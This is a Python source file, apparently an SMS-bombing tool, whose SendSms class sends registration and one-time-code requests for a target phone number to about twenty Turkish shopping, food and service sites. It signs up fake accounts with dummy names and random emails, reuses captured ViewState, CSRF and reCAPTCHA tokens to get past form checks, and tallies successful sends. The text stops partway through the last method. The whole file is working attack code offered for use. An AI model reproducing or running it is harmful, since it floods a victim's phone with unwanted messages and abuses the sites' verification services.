import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style
from json import dumps

class SendSms():
    random_mail = ''.join(choice(ascii_lowercase) for i in range(20))
    adet = 0
    
    def __init__(self, phone):
        self.phone = phone

    
    #borsadirekt.com--sms
    def borsaDirekt(self):
        try:
            borsadirekt = requests.post("https://www.borsadirekt.com/uye-ol-ilk-adim", data={
                "__EVENTTARGET": "",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": "E9oXyVbJT2d5f6xQSQWjrWVoWB/Rv7ODfCesLJ4nHRYzFXVFIVIbvBD1BdBLLuWUqhTTeFcPBF5OZXA1XaMiCrj2gdRtqMmGE2WoLR/o2oAOEt6PyC05bmja7eiw1FZxRdY/qHvhF2UZ+b/e5YH7ZzxVtJnvVzn25unTu65v1ebqHouIKX/NH3a/F+soQqYi+dFzdbOAw1+W8VZKGQ1hbQJTIjJ6+K34IW+2Qmpm1PkDC864gw4NNmDYhgZvmeEeOhGZd3S4MUXRRtQAu9nyd3MR0U24BLKZo4zGKF0ZmGpjmSBG62vcrw4p7uyYzh9w4ZB1g28wbSEdXgtm7AIefopw87q5HcUuV0d3e1d9I+69Dxsjj86kuvllIZJHasQKI4gd3NhKNR2mCb9VUEXeEZaWrRmyuhoSLSNbh7PIldYAV2J/nFWSjgVxYzdprUkmtfETXvJekOha0kbYR/FBHw3VMVBPIJNGlEEQE5xIaFdERLDW4ms7hkn7deBQk+5FihOFQ8kQKohTvTXdSWt9sCYhWPQ3wnHfA3Qf94mavvPpvPf9kR8+ODHeS9yAlbShRwBWcvs/ar75R/AD7mq3YL80TMDHiXPe5JvASkILk0KMplkT72bI3sdDJnYIcx+lqfTKOXF9mBdpDH6FaVM/L/WJAFLaok+ACAR+XIuiF3LhFsX1Y1cHcAxecvIoY8k+nM5fDPy7pc+ycM5TLm8q5gEM1dCUHKpG9zLcwVa7KQpweNOUprKl600usnwCTmNJnUzC7WJY0MUUOQkF9kU4gP1gDXqaUHOI+AN+cpVRnSvIHY1OijXIhjE72ZLZFeOdPIY3ZjVBUUOCm0Lf3XVW/R1OdTZK3hfAiQn9d+tPSYhfB+nDwox2ewhZKufIA1CQ06q6eR3V59Cy3aXA/gqlzGv//skWHPT4QvfDk++dWPN2TXegDollFhoTJbkJVRZByAI97JnhpVZC1nK+awWHhe7UijzywCLqtkJZZXhRvnkr9R89gEpHGRmsVaJH4AZhh5uVGbLqfIUJsdJG/UGWHTkmqKn2gv5Jf67BEHhHIrPXAaLLVubD8xeweiOZh6FWYZiRDzK+qzHOXFJ/X6Bbeu4KqXlUe1kn8PK+Z7E+TploeWnwsQVLpqxUXmTrjrUh/zCgqRHAstnr8pUIj/dFiVGhQtlzSllXSy6oW2RiLJIaCjKL4PJ85aECzbSSOrUe/U+IDNg+Ds0HM/tXaCYazPqwU1R9NpEgln9ZkD+dGxqPcvzDppkBx2Pp5wmUkJPPXKDhvV/rcF0k4BwhVBWiZodyYJ1gCksCiW3EzlzJJmkGM/1PE7Zw8HGSEKpGPYtPeAJtQij3Ft9l/Am1utMrgFDDpVD7RMJDsugFNLgHQBhk0kiV4eCjMWbSY+B76Urr9B5Dmr/9Unx0OQCZc+Z0D3tzkBW6DkMgcMs/r0btajLumRtXG68Z4BDsyBRi9UDRWTKOCqWX920IViJB6GGojx6ed8zeHb+uZH7ruyyhYV2ZGlWZh5wl5jCY0gM4WezatAher4wXRWW9qGB2lHZ3CcT/1YZScFielEspNf7vNmJ+ywx0rYGFwJNTEDV2JwLE/dq0wRjV0pTjKi5bJPBVDUEa8KhP5obiiZxN/1XksOSyl8WVxuiYNXkmOzAan94gXmUlwJqOt/P3oHqs5wIru8j0HHMyuJtOrBtsJaakVyYAlOpUTqfzRlpmznYlOZvWLZiFcFeZ9ldC0SP/hsg2hWuVnNS+ytcQJmD+L1Z/xyKO2tvGksm2Ldz3FcSkzkQZphdzWAhKALiHYx2tVbKoXOHnPBvRHaOEgGqui7LYFGugDbLhTFFYO/Fee6XByP7GFVuOl2V2cyb11Cynyzy+3g4X7NoDosuBv6zcWi59Yxhq2pdkoEf+YZs7Hj5xvQZrormsOEUHDIChZklg8m9Oh9auJf9TCQJzEm1CY5gMqA88455v+wNlwLBsRhhvdQfFYUljHiXNWf8sdlYTCjhxzxXUNh15MOMv0vBBkRQUz86/TInLvmmma1Fp9+hOqbIN/X9yAD9pJw9GDxH4Fhv2ZAbCtsx3ng6mJ4mkdmM14IrdRVMQ0rFr/JQdM+y31R5NymhlCUz4gwag8LagzBCgNBj8li0z0v94oSnUn86dF/5FAU9kAmMl7ZlARoNZjJ6jJDyK9qRYya2GYoVfsvsPmIF1MbNKzrypRuFa4dJLEMQYBZU0HRJt8QC2h6W4Ut2I7rk8HJ8H+SEwmbPdXKs4EkDbEenPHKcN5YPv5Usoi+dDC+Ctfc+HMiqRJ5+EP7nmZEpG7ssg0G+RBfVT4tOXyLHd+FlM42XkTjnJYn4R4lg/S5duxtVy8SsWGvNn9ABJt219kX11tTyAZ81PQvAtvoHgn0x5+b5GSYcDqBTwSTPM03STpZlInAme5BVgzlhn6ndaK47JkTZU7HGlh5cNWEJ+ghby+oXcnj/3oEyCTJGCpMzjQXJtO0Cwj9AaPB1qhv6/8IJ9SOG1rHyoXsihlg4ns/ma7MowhaVQnOJHm0bGZHvbKQNYR6I5rO26nw5+w87TuWu+TQZX5TKNMVfX2RB555rA21j8C4E8MFf0TWbe2ezKJlU3JJhAvPHjpPhef2zNtbqMUi8VwemE5gkjScNP4N0DsEtbbqNBVWEzanpXLa7YQUguAnzyoFU7wNyRuKfBlQEm37KKscyF7fpODr3tVDM+qB6BZeOINLG9OEBjGriXkfRh4zh5V75xbcTEgxICL2iso1YLJy6NuAByTvc2PhDx/62fXd3nT/W+lOIK1kgBkjEq6q+VWPoe3tx7MT9EcqKtrRvmIeWmuRbE+M09kdpSiSDqK6ru8MdID1WEAHqe4MTgW/qlVHAMQotraC1JBbQdoMqeBCeWoT3Zjcb6QVQBlpeyzHGetjnUUDD57VEBdlddz/Jzdqh90wsPu7lADjImeuBP069YlHMEMnZLe9medJ6w7qBZPpKXgZbkGz7G9+QpzVpO0o2Jxt8rseEAv9hoqIIi1zhlLQLEkMMuSffwzm+vGtOxWnjFnw+v16xZ8fG2auNg2gQKakT1",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserName": "Memati",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterSurName": "Bas",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserEmail": f"{self.random_mail}@gmail.com",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$drpCity": "34",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserPassword": "31ABC..abc31",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserConfirmPassword": "31ABC..abc31",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$drpMobilOperator": "501",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$txtRegisterUserPhoneNumber": self.phone,
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$CheckOK": "on",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$chAdwords": "on",
                "ctl00$ContentPlaceHolder1$ucRegisterFirstPoint$CreateUserSubmit": "ÜYE+OL",
                "zc_gad": "undefined",
                "__VIEWSTATEGENERATOR": "A8BD42AF",
                "__EVENTVALIDATION": "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"
            })
            if borsadirekt.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> borsadirekt.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> borsadirekt.com")
        
        
    # dsmartgo.com.tr--sms--zaman-3dk
    def dsmartgo(self):    
        dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	"IsSubscriber": "true",
        	"__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	"Mobile": self.phone,
        }, cookies={
        		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		"_ga": "GA1.3.1016548678.1638216163",
        		"_gat": "1",
        		"_gat_gtag_UA_18913632_14": "1",
        		"_gid": "GA1.3.1214889554.1638216163",
        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	})
        try:
            BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")
        except AttributeError:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr")
            self.adet += 1
        

    #satisgaranti.com--sms--zaman
    def satisGaranti(self):    
        satisgaranti = requests.post("https://www.satisgaranti.com/get-code", data={
            "phone": f"0{self.phone}",
            "code": ""
        })
        try:
            satisgaranti.json()["text_code_response"]
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> satisgaranti.com")
            self.adet += 1
        except KeyError:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> satisgaranti.com")
        

    # kigili.com--sms
    def kigili(self):    
        try:
            kigili = requests.post("https://www.kigili.com/users/registration/", data={
                "first_name": "Memati",
                "last_name": "Bas",
                "email": f"{self.random_mail}@gmail.com",
                "phone": f"0{self.phone}",
                "password": "31ABC..abc31",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            })
            if kigili.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com")
        

    # market.sleepy.com.tr--sms
    def sleepy(self):    
        try:
            sleepy = requests.post("https://market.sleepy.com.tr/Customer/SendCode/", data={
                "phoneNumber": f"0{self.phone}",
                "firstName": "Memati", 
                "lastName": "Bas",
                "email": f"{self.random_mail}@gmail.com",
                "type": "customer",
                "registerType": "1",
                "campaingPermission": "true"
            })
            if sleepy.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sleepy.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sleepy.com.tr")
        

    #kahvedunyasi.com--sms--zaman-1dk
    def kahveDunyasi(self):    
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                "mobile_number": self.phone,
                "token_type": "register_token"
            })
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kahvedunyasi.com")
        

    #watsons.com.tr--sms
    # def watsons(self):    
    #     try:
    #         watsons = requests.post("https://www.watsons.com.tr/Customer/VerifyPhoneNumber", data={
    #             "phoneNumber": self.phone,
    #             "email": f"{self.random_mail}@gmail.com",
    #             "isLogin": "false",
    #             "getCustomerPhone": "false"
    #         }, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"})
    #         if watsons.json()["Success"] == True:
    #             print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr")
    #             self.adet += 1
    #         else:
    #             raise
    #     except:
    #         print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr")
        

    # babyturco.com--sms
    def babyTurco(self):    
        try:
            baby_turco = requests.post("https://market.babyturco.com.tr/Customer/SendCode/", data={
                "phoneNumber": f"0{self.phone}",
                "firstName": "Memati",
                "lastName": "Bas",
                "email": f"{self.random_mail}@gmail.com",
                "type": "customer",
                "campaingPermission": "true"
            })
            if baby_turco.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> babyturco.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> babyturco.com.tr")
        

    # petrolofisi.com.tr--sms
    def petrolOfisi(self):
        try:    
            url = "https://onlineislemler.petrolofisi.com.tr:443/Authentication/Register"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://onlineislemler.petrolofisi.com.tr", "Dnt": "1", "Referer": "https://onlineislemler.petrolofisi.com.tr/authentication/login?ReturnUrl=%2F", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            data = {"name": "Memati", "surname": "Bas", "phone": f"0{self.phone}", "referenceCode": '', "cardNo": '', "plate": "31ABC31", "contractPermission": "true", "contactPermission": "true", "kvkkPermission": "true"}
            petrol_ofisi = requests.post(url, headers=headers, data=data)
            if petrol_ofisi.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> petrolofisi.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> petrolofisi.com.tr")
        

    #podyumplus.com--sms
    def podyumPlus(self):    
        try:
            podyumplus = requests.get(f"https://www.podyumplus.com/index.php?route=account/account/control&telephone={self.phone}")
            if podyumplus.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> podyumplus.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> podyumplus.com")
        
    
    # otokocikinciel.com--sms
    def otoKocikinciel(self):    
        try:    
            otokocikinciel = requests.post("https://www.otokocikinciel.com/Ajax/SendOtp", data={
                "GsmNos": self.phone,
                "PermissionType": "1"
            })
            if otokocikinciel.json()["Result"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> otokocikinciel.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> otokocikinciel.com")
         
    
    #naosstars.com--sms
    def naosStars(self):
        try:
            naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                "email": f"{self.random_mail}@gmail.com",
                "first_name": "Memati",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "date_of_birth": "1975-12-31",
                "phone": f"0{self.phone}",
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            })
            if naosstars.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> naosstars.com")
                self.adet += 1 
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> naosstars.com")
          
    
    #ohalisaha.com--sms   
    def ohaliSaha(self):
        try:
            ohalisaha = requests.post("https://ohalisaha.com/Uye/OnayKoduGonder", data={
                "tel": self.phone
            })
            if ohalisaha.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ohalisaha.com")
                self.adet += 1  
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ohalisaha.com")
         
    
    #wmf.com.tr--sms
    def wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": f"{self.random_mail}@gmail.com",
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> wmf.com.tr")
         
            
    #vans.com.tr--sms--zaman-15dk
    def vans(self):
        try:
            vans =  requests.post("https://www.vans.com.tr/Uye/CheckPhoneAndSendSms", data={
                "phone": self.phone
            })
            if vans.json()["message"] == "Sms Gönderildi":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> vans.com.tr")
                self.adet += 1  
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> vans.com.tr")
          
    
    #eastpak.com.tr--sms--zaman-15dk
    def eastpak(self):
        try:
            eastpak = requests.post(f"https://www.eastpak.com.tr/Uye/CheckPhoneAndSendSms?phone={self.phone}")
            if eastpak.json()["message"] == "Sms Gönderildi":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> eastpak.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> eastpak.com.tr") 


    #istegelsin.com--sms--zaman-2dk
    def isteGelsin(self):
        try:
            istegelsin = requests.post("https://prod.fasapi.net/", data=dumps({"query": "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
                    "variables": {
                        "phoneNumber": "90"+self.phone
                    }
                }))
            if istegelsin.json()["data"]["sendOtp2"]["alreadySent"] == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> istegelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> istegelsin.com")
    
    
    #bim--sms
    def bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.com")
            
        
    #ceptesok.com--sms--zaman-1dk
    def sok(self):
        try:
            json={"mobile_number": self.phone, "token_type": "register_token"}
            sok = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json=json)
            if len(sok.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ceptesok.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ceptesok.com")
            
    
    #tiklagelsin.com--sms
    def tiklagelsin(self):
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": self.phone
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> tiklagelsin.com")
            
    
    #migros.com.tr--sms
    def migros(self):
        try:
            migros = requests.post("https://rest.sanalmarket.com.tr:443/sanalmarket/users/login/otp",  json={"phoneNumber": self.phone})
            if migros.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> migros.com.tr")
            
    
    #A101 Kapida--sms
    def yuzbir(self):
        try:
            url = "https://kapida.akinon.net:443/a101-app/users/registration/"
            headers = {"Content-Type": "multipart/form-data; boundary=_VyWRVFfZG3sOwjZ2n6wKiGIqsWPVO3zO0eaVIW0RC7N9zq.jtPePNtBBHuYZENh4ntsAF", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-tr", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://kapida.akinon.net/", "User-Agent": "A101%20Kapida/1 CFNetwork/1240.0.4 Darwin/20.6.0", "X-Csrftoken": "yuqNcGjogZEPwScxl6qXjKPSQljBJhc9e3fK1uuHvZgBH91lxFYpPl1rbPjUeGB6"}
